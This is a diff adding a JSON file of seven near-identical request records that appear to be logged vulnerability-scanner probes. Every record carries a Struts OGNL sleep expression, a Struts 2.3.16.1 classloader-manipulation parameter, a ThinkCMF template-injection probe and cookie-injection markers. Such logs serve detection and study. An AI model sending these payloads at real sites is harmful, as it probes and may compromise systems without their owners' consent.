@@ -1,0 +1,51 @@
+[
+ {
+  "_meta_http_equiv": "Set-Cookie content=\"testcgtp=579\">",
+  "_script_document_cookie": "\"testcgtp=579",
+  "class_classLoader_URLs_0_": "struts_2_3_16_1_classloader_manipulation-1603621910",
+  "content": "<php>die(@md5(HelloThinkCMF))</php>",
+  "expression": "#_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Thread@sleep(5000)"
+ },
+ {
+  "_meta_http_equiv": "Set-Cookie content=\"testcgtp=579\">",
+  "_script_document_cookie": "\"testfeim=9745",
+  "class_classLoader_URLs_0_": "struts_2_3_16_1_classloader_manipulation-1603621910",
+  "content": "<php>die(@md5(HelloThinkCMF))</php>",
+  "expression": "#_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Thread@sleep(5000)"
+ },
+ {
+  "_meta_http_equiv": "Set-Cookie content=\"testtnfh=9688\">",
+  "_script_document_cookie": "\"testtnfh=9688",
+  "class_classLoader_URLs_0_": "struts_2_3_16_1_classloader_manipulation-1603621910",
+  "content": "<php>die(@md5(HelloThinkCMF))</php>",
+  "expression": "#_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Thread@sleep(5000)"
+ },
+ {
+  "_meta_http_equiv": "Set-Cookie content=\"testobnn=9888\">",
+  "_script_document_cookie": "\"testobnn=9888",
+  "class_classLoader_URLs_0_": "struts_2_3_16_1_classloader_manipulation-1603621910",
+  "content": "<php>die(@md5(HelloThinkCMF))</php>",
+  "expression": "#_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Thread@sleep(5000)"
+ },
+ {
+  "_meta_http_equiv": "Set-Cookie content=\"testmtpq=6410\">",
+  "_script_document_cookie": "\"testmtpq=6410",
+  "class_classLoader_URLs_0_": "struts_2_3_16_1_classloader_manipulation-1603621910",
+  "content": "<php>die(@md5(HelloThinkCMF))</php>",
+  "expression": "#_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Thread@sleep(5000)"
+ },
+ {
+  "_meta_http_equiv": "Set-Cookie content=\"testeinu=2205\">",
+  "_script_document_cookie": "\"testeinu=2205",
+  "class_classLoader_URLs_0_": "struts_2_3_16_1_classloader_manipulation-1605657696",
+  "content": "<php>die(@md5(HelloThinkCMF))</php>",
+  "expression": "#_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Thread@sleep(5000)"
+ },
+ {
+  "_meta_http_equiv": "Set-Cookie content=\"testytkt=3037\">",
+  "_script_document_cookie": "\"testytkt=3037",
+  "class_classLoader_URLs_0_": "struts_2_3_16_1_classloader_manipulation-1605658394",
+  "content": "<php>die(@md5(HelloThinkCMF))</php>",
+  "expression": "#_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Thread@sleep(5000)"
+ }
+]
